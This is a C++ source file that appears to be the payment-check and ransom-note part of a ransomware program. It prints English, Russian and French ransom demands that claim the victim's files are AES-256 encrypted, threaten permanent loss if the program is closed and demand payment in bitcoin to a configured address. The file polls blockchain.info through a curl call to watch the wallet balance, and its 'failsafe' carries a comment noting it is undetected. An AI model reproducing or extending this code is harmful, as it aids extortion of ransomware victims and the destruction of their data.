#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <thread>
#include <Windows.h>
#pragma comment(lib, "User32.lib")
#include "settings.h"

bool downloadJSON(const std::string& url, const std::string& outputFilename) {
    std::string command = "curl -s -o " + outputFilename + " " + url;
    int result = system(command.c_str());
    return result == 0;
}

std::string extractFinalBalance(const std::string& jsonData) {
    std::size_t pos = jsonData.find(("\"final_balance\":"));
    if (pos != std::string::npos) {
        std::string balanceSubstring = jsonData.substr(pos);

        std::size_t digitPos = balanceSubstring.find_first_of(("0123456789"));
        if (digitPos != std::string::npos) {
            std::string balance = balanceSubstring.substr(digitPos);

            std::size_t endPos = balance.find_first_not_of(("0123456789"));
            if (endPos != std::string::npos) {
                balance = balance.substr(0, endPos);
            }

            return balance;
        }
    }

    return ("Final balance not found in JSON data");
}

int fail_safe() { // FAILSAFE -> SHIFT (not ud)
    if (GetKeyState(VK_SHIFT) & 0x8000)
    {
        return 3;
    }
    else
    {
        return 9;
    }
}

bool is_payed() {

    std::string url = "https://blockchain.info/rawaddr/" + __btc_addy; // -> actuall addy
    std::string outputFile = "C:/rawinfo.json";

    if (!downloadJSON(url, outputFile)) {
    }

    std::ifstream file(outputFile);
    if (!file.is_open()) {
    }

    std::string jsonData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    std::string initial_balance = extractFinalBalance(jsonData);

    while (true)
    {

        if (fail_safe() == 3)
        {
            return true;
        }

        system("cls");
        downloadJSON(url, outputFile);
        std::string current_balance = extractFinalBalance(jsonData);

        if (__language::english_en)
        {
            std::cout << (("\n [ en_i ] -> As you can tell, all your files have been encrypted. We use AES-256 military-grade encryption! \n"));
            std::cout << (("\n [ en_! ] -> Closing this program or your computer COULD MAKE YOUR FILES UNRECOUVERABLE! \n"));
            std::cout << (("\n [ en_# ] -> Pay " + __amount + " USD in BTC to " + __btc_addy + " to decrpyt your files!\n"));
            std::cout << (("\n [ en_/ ] -> Waiting for payment...\n"));
            std::cout << (("\n [ - ] -> -----------------------------------------------------------------------------------------------------\n"));
        }
        if (__language::russian_ru)
        {
            std::cout << (("\n [ ru_i ] -> Kak vy mozhete zametit', vse vashi fayly zashifrovany. My ispol'zuyem shifrovaniye voyennogo urovnya AES-256! \n"));
            std::cout << (("\n [ ru_! ] -> Zakrytiye etoy programmy ili vashego komp'yutera MOZHET SDELAT' VASHI FAYLY NEVOZVRATIMYMI! \n"));
            std::cout << (("\n [ ru_# ] -> Zaplatite " + __amount + " dollarov SSHA v BTC na schet " + __btc_addy + ", chtoby rasshifrovat' vashi fayly!\n"));
            std::cout << (("\n [ ru_/ ] -> Ozhidayetsya platezh...\n"));
        }
       
        if (__language::french_fr)
        {
            std::cout << (("\n [ - ] -> -----------------------------------------------------------------------------------------------------\n"));
            std::cout << (("\n [ fr_i ] -> Comme vous pouvez le constater, tous vos fichiers ont ete cryptes. Nous utilisons le cryptage de niveau militaire AES-256! \n"));
            std::cout << (("\n [ fr_! ] -> La fermeture de ce programme ou de votre ordinateur POURRAIT RENDRE VOS FICHIERS IRRÉCUPÉRABLES! \n"));
            std::cout << (("\n [ fr_# ] -> Payez " + __amount + " USD en BTC a " + __btc_addy + " pour décrypter vos fichiers!\n"));
            std::cout << (("\n [ fr_/ ] -> En attente du paiement...\n"));
        }

        if (current_balance > initial_balance)
        {
            return true;
        }

        Sleep(5000);

        system("color b");
    }

    return false;
}
